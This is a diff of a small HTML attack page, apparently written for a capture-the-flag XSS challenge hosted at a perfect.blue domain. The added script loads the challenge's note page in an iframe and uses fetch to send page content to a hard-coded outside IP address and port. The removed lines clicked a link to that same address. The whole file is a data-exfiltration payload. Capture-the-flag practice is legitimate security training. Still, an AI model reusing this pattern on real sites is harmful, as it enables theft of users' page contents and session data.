@@ -1,14 +1,16 @@
 
 <html>
 		<body>
-				<p>
-					<a id="test" href="http://206.189.15.196:1234/"> some </a>
-				</p>
+				<iframe src=https://tbdxss.chal.perfect.blue/note id="hello">
+				
+
+				</iframe>
 		</body>
-
+		
 		<script>
-			document.cookie = "session=test"
-			document.getElementById("test").click();
+			var iframe = document.getElementById("hello");
+			var iframeContent = iframe.contentWindow.document;
+			var flag = document.body;
+			fetch("http://206.189.15.196:1234/"+flag)
 		</script>
-
 </html>
